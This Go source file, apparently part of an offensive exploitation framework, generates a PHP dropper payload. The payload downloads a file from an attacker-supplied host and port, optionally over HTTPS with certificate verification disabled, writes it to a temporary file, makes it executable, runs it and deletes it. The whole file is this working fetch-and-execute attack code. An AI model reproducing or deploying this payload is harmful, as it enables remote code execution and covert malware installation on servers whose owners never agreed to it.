package dropper

import (
	"fmt"
)

// Using PHP: download a remote file, write a tmp file, set it to executable, execute it, and delete it.
func (php *PHPPayload) HTTP(lhost string, lport int, ssl bool, downloadFile string) string {
	cmd := "<?php "
	if ssl {
		// download the data over ssl (ignoring cert validation)
		cmd += `$options = array("ssl" => array("verify_peer" => false,"verify_peer_name" => false,),);`
		cmd += `$context = stream_context_create($options);`
		cmd += fmt.Sprintf(`$d = file_get_contents("https://%s:%d/%s", false, $context);`, lhost, lport, downloadFile)
	} else {
		// download the data
		cmd += fmt.Sprintf(`$d = file_get_contents("http://%s:%d/%s");`, lhost, lport, downloadFile)
	}
	// generate a random file
	cmd += `$o=tempnam(sys_get_temp_dir(), "");`
	// write the data
	cmd += `file_put_contents($o,$d);`
	// set the download binary as executable
	cmd += `chmod($o, 0755);`
	// execute it
	cmd += `exec($o);`
	// delete it
	cmd += `unlink($o); ?>`

	return cmd
}
